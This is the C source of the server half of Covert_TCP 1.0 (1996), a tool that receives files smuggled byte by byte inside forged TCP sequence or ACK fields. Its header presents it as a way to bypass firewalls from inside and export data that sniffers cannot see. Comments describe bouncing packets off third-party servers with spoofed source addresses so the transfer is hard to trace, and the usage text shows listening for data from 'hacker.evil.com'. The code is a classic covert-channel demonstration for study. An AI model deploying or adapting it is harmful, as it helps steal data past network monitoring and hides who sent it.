/* Covert_TCP 1.0 - Covert channel file transfer for Linux
* Written by Craig H. Rowland (crowland@psionic.com)
* Copyright 1996 Craig H. Rowland (11-15-96)
* NOT FOR COMMERCIAL USE WITHOUT PERMISSION. 
* 
*
* This program manipulates the TCP/IP header to transfer a file one byte
* at a time to a destination host. This progam can act as a server and a client
* and can be used to conceal transmission of data inside the IP header. 
* This is useful for bypassing firewalls from the inside, and for 
* exporting data with innocuous looking packets that contain no data for 
* sniffers to analyze. In other words, spy stuff... :)
*
* PLEASE see the enclosed paper for more information!!
*
* This software should be used at your own risk. 
*
* compile: cc -o covert_tcp covert_tcp.c
*
* 
* Portions of this code based on ping.c (c) 1987 Regents of the 
* University of California. (See function in_cksm() for details)
*
* Small portions from various packet utilities by unknown authors
*/

#include "server.h"

int main(int argc, char *argv[]){

   unsigned int source_host=0,dest_host=0;
   unsigned short source_port=0,dest_port=80;
   int seq=0,ack=0,file=0;
   int count;
   char desthost[80],srchost[80],filename[80];

   if(geteuid() !=0)
    {
    printf("\nYou need to be root to run this.\n\n");
    exit(0);
    }

   if((argc < 6) || (argc > 13))
   {
   usage(argv[0]);
   exit(0);
   }


   for(count=0; count < argc; ++count)
    {
    if (strcmp(argv[count],"-dest") == 0)
     {
     dest_host=host_convert(argv[count+1]); 
     strncpy(desthost,argv[count+1],79);
     }
     
    else if (strcmp(argv[count],"-source") == 0)
     {
     source_host=host_convert(argv[count+1]); 
     strncpy(srchost,argv[count+1],79);
     }

    else if (strcmp(argv[count],"-file") == 0)
     {
     strncpy(filename,argv[count+1],79);
     file=1;
     }

    else if (strcmp(argv[count],"-source_port") == 0)
      source_port=atoi(argv[count+1]);

    else if (strcmp(argv[count],"-dest_port") == 0)
      dest_port=atoi(argv[count+1]);

    else if (strcmp(argv[count],"-seq") == 0)
      seq=1;

    else if (strcmp(argv[count],"-ack") == 0)
      ack=1;

    }
    
   if(seq+ack == 0)
    seq=1; 
    
   else if (seq+ack !=1)
    {
    printf("\n\nOnly one encoding/decode flag (-seq -ack) can be used at a time.\n\n");
    exit(1);
    }

   if(file != 1)
    {
    printf("\n\nYou need to supply a filename (-file <filename>)\n\n");
    exit(1);
    }
    
    if (source_host == 0 && source_port == 0)
      {
      printf("You need to supply a source address and/or source port for server mode.\n");
      exit(1);
      }

     if(dest_host == 0)
      strcpy(desthost,"Any Host");

     if(source_host == 0)
      strcpy(srchost,"Any Host");

     printf("Listening for data from IP: %s\n",srchost);
     
     if(source_port == 0)
      printf("Listening for data bound for local port: Any Port\n");

     else
      printf("Listening for data bound for local port: %u\n",source_port);

     printf("Decoded Filename: %s\n",filename);

     if(seq == 1)
      printf("Decoding Type Is: IP Sequence Number\n");

     else if(ack == 1)
      printf("Decoding Type Is: IP ACK field bounced packet.\n");

     printf("\nServer Mode: Listening for data.\n\n");

     forgepacket(source_host, dest_host, source_port, dest_port,filename,seq,ack);
	  exit(0);
}

void forgepacket(unsigned int source_addr, unsigned int dest_addr, unsigned \
short source_port, unsigned short dest_port, char *filename, int seq, int ack) {

   struct recv_tcp
   {
      struct iphdr ip;
      struct tcphdr tcp;
      char buffer[10000];
   } recv_pkt;

   int recv_socket;
   FILE *output;
   
   srand((getpid())*(dest_port)); 
   
    if((output=fopen(filename,"wb"))== NULL)
  {
  printf("I cannot open the file %s for writing\n",filename);
  exit(1);
  }

 while(1) 
 {

   recv_socket = socket(AF_INET, SOCK_RAW, 6);
   
   if(recv_socket < 0)
   {
      perror("receive socket cannot be open. Are you root?");
      exit(1);
   }

  read(recv_socket, (struct recv_tcp *)&recv_pkt, 9999);


        if (source_port == 0) 
        {       
                if((recv_pkt.tcp.syn == 1) && (recv_pkt.ip.saddr == source_addr)) 
                {
								if (seq==1)
                        {
                        	printf("Receiving Data: %c\n",recv_pkt.tcp.seq);
                        	fprintf(output,"%c",recv_pkt.tcp.seq); 
                        	fflush(output);
                        }

        /* Use a bounced packet from a remote server to decode the data */
        /* This technique requires that the client initiates a SEND to */
        /* a remote host with a SPOOFED source IP that is the location */
        /* of the listening server. The remote server will receive the packet */
        /* and will initiate an ACK of the packet with the encoded sequence */
        /* number+1 back to the SPOOFED source. The covert server is waiting at this */
        /* spoofed address and can decode the ack field to retrieve the data */
        /* this enables an "anonymous" packet transfer that can bounce */
        /* off any site. This is VERY hard to trace back to the originating */
        /* source. This is pretty nasty as far as covert channels go... */
        /* Some routers may not allow you to spoof an address outbound */
        /* that is not on their network, so it may not work at all sites... */
        /* SENDER should use covert_tcp with the -seq flag and a forged -source */
        /* address. RECEIVER should use the -server -ack flags with the IP of */
        /* of the server the bounced message will appear from.. CHR */

        /* The bounced ACK sequence number is really the original sequence*/
        /* plus one (ISN+1). However, the translation here drops some of the */
        /* bits so we get the original ASCII value...go figure.. */

                        else if (ack==1)
                        {
                         printf("Receiving Data: %c\n",recv_pkt.tcp.ack_seq);
                         fprintf(output,"%c",recv_pkt.tcp.ack_seq); 
                         fflush(output);
                        }
                } 
        } 

        else
        {
                if((recv_pkt.tcp.syn==1) && (ntohs(recv_pkt.tcp.dest) == source_port)) 
                {
								if (seq==1)
                        {
                        printf("Receiving Data: %c\n",recv_pkt.tcp.seq);
                        fprintf(output,"%c",recv_pkt.tcp.seq); 
                        fflush(output);
                        }
                      
                        else if (ack==1)
                        {
                        printf("Receiving Data: %c\n",recv_pkt.tcp.ack_seq);
                        fprintf(output,"%c",recv_pkt.tcp.ack_seq); 
                        fflush(output);
                        }
                } 
        } 

   close(recv_socket); 
  }

  fclose(output);
}

unsigned short in_cksum(unsigned short *ptr, int nbytes)
{
        register long           sum;            /* assumes long == 32 bits 
*/
        u_short                 oddbyte;
        register u_short        answer;         /* assumes u_short == 16 bits */

        /*
         * Our algorithm is simple, using a 32-bit accumulator (sum),
         * we add sequential 16-bit words to it, and at the end, fold back
         * all the carry bits from the top 16 bits into the lower 16 bits.
         */

        sum = 0;
        while (nbytes > 1)  {
                sum += *ptr++;
                nbytes -= 2;
        }

                                /* mop up an odd byte, if necessary */
        if (nbytes == 1) {
                oddbyte = 0;            /* make sure top half is zero */
                *((u_char *) &oddbyte) = *(u_char *)ptr;   /* one byte only */
                sum += oddbyte;
        }

        /*
         * Add back carry outs from top 16 bits to low 16 bits.
         */

        sum  = (sum >> 16) + (sum & 0xffff);    /* add high-16 to low-16 */
        sum += (sum >> 16);                     /* add carry */
        answer = ~sum;          /* ones-complement, then truncate to 16 bits 
*/
        return(answer);
}


unsigned int host_convert(char *hostname)
{
   static struct in_addr i;
   struct hostent *h;
   i.s_addr = inet_addr(hostname);
   if(i.s_addr == -1)
   {
      h = gethostbyname(hostname);
      if(h == NULL)
      {
         fprintf(stderr, "cannot resolve %s\n", hostname);
         exit(0);
      }
      bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);
   }
   return i.s_addr;
} 


void usage(char *progname)
{
      printf("Covert TCP usage: \n%s -dest dest_ip -source source_ip -file \
filename -source_port port -dest_port port [encode type]\n\n", 
progname);
      printf("-dest dest_ip      - Host to send data to.\n");
      printf("-source source_ip  - Host data will be coming FROM.\n");
      printf("-source_port port  - IP source port you want data to appear from. \n");
      printf("                     (randomly set by default)\n");
      printf("-dest_port port    - IP source port you want data to go to. In\n");
      printf("                     SERVER mode this is the port data will be coming\n");
      printf("                     inbound on. Port 80 by default.\n");
      printf("-file filename     - Name of the file to encode and transfer.\n");
      printf("[Encode Type] - Optional encoding type\n");
      printf("-seq  - Encode data a byte at a time in the packet sequence \
number.\n");
      printf("-ack  - DECODE data a byte at a time from the ACK field.\n");
      printf("        This ONLY works from server mode and is made to decode\n");
      printf("        covert channel packets that have been bounced off a remote\n");
      printf("        server using -seq. See documentation for details\n");
      printf("\nPress ENTER for examples.");
      getchar();
      printf("\nExample: \nserver -dest foo.bar.com -source hacker.evil.com - \
dest_port 80 -file secret.c\n\n");
      printf("Above listens passively for packets from  hacker.evil.com\n");
      printf("destined for port 80. It takes the data and saves the file locally\n");
      printf("as secret.c\n\n");
      exit(0);
} 

